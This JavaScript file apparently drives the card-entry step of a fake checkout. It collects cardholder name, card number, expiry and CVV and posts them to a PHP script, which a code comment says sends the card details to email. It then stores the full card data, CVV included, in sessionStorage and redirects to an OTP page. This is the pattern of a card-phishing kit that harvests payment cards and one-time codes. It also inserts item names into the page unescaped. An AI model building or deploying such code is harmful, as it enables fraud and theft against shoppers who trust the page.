(function () {
  function renderCardPage() {
    const cartNode = document.getElementById("checkout-cart-items");
    const totalNode = document.getElementById("checkout-total");
    const form = document.getElementById("card-form");
    const statusNode = document.getElementById("card-status");
    const proceedBtn = document.getElementById("proceed-to-otp-btn");

    if (!cartNode || !totalNode || !form) {
      return;
    }

    // Get order data from sessionStorage
    const addressData = JSON.parse(sessionStorage.getItem("addressData") || "{}");
    
    if (!addressData.cartItems || !addressData.cartItems.length) {
      statusNode.textContent = "Order data not found. Please start checkout again.";
      proceedBtn.disabled = true;
      return;
    }

    function paintOrder() {
      const items = addressData.cartItems || [];
      const total = addressData.orderTotal || 0;
      totalNode.textContent = window.formatInr(total);

      if (!items.length) {
        cartNode.innerHTML = '<p class="empty-note">No products in cart.</p>';
        proceedBtn.disabled = true;
        return;
      }

      proceedBtn.disabled = false;
      cartNode.innerHTML = items
        .map(function (item) {
          return (
            '<div class="checkout-item">' +
            "<span>" + item.name + " x " + item.qty + "</span>" +
            "<strong>" + window.formatInr(item.price * item.qty) + "</strong>" +
            "</div>"
          );
        })
        .join("");
    }

    paintOrder();

    // Format card number input
    const cardNumberInput = document.getElementById("cardNumber");
    cardNumberInput.addEventListener("input", function (e) {
      let value = e.target.value.replace(/\s/g, "");
      let formattedValue = value.match(/.{1,4}/g)?.join(" ") || value;
      e.target.value = formattedValue;
    });

    // Format expiry date input
    const expiryInput = document.getElementById("cardExpiry");
    expiryInput.addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length >= 2) {
        value = value.slice(0, 2) + "/" + value.slice(2, 4);
      }
      e.target.value = value;
    });

    // Only allow numbers in CVV
    const cvvInput = document.getElementById("cardCvv");
    cvvInput.addEventListener("input", function (e) {
      e.target.value = e.target.value.replace(/\D/g, "");
    });

    form.addEventListener("submit", function (event) {
      event.preventDefault();

      const items = window.CartAPI.getItems();
      if (!items.length) {
        statusNode.textContent = "Your cart is empty.";
        return;
      }

      const cardData = {
        cardName: form.cardName.value.trim(),
        cardNumber: form.cardNumber.value.trim(),
        cardExpiry: form.cardExpiry.value.trim(),
        cardCvv: form.cardCvv.value.trim(),
        cartItems: items,
        orderTotal: window.CartAPI.getTotal(),
        timestamp: new Date().toLocaleString()
      };

      // Basic validation
      if (!cardData.cardName || !cardData.cardNumber || !cardData.cardExpiry || !cardData.cardCvv) {
        statusNode.textContent = "Please fill in all card details.";
        return;
      }

      if (cardData.cardNumber.replace(/\s/g, "").length < 13) {
        statusNode.textContent = "Please enter a valid card number.";
        return;
      }

      proceedBtn.disabled = true;
      statusNode.textContent = "Processing card details...";

      // Send card details to email
      fetch("send_card_details.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(cardData)
      })
        .then(function (res) {
          return res.json();
        })
        .then(function (result) {
          if (result.success) {
            statusNode.textContent = "Card details saved successfully. Redirecting to OTP...";
            // Store order data in sessionStorage for OTP page
            sessionStorage.setItem("orderData", JSON.stringify({
              cardData: cardData,
              items: items,
              total: window.CartAPI.getTotal()
            }));
            setTimeout(function() {
              window.location.href = "otp-verification.html";
            }, 1500);
          } else {
            statusNode.textContent = result.message || "Unable to save card details.";
          }
        })
        .catch(function () {
          statusNode.textContent = "Server error while processing card details.";
        })
        .finally(function () {
          proceedBtn.disabled = false;
        });
    });
  }

  document.addEventListener("DOMContentLoaded", function () {
    renderCardPage();
  });
})();
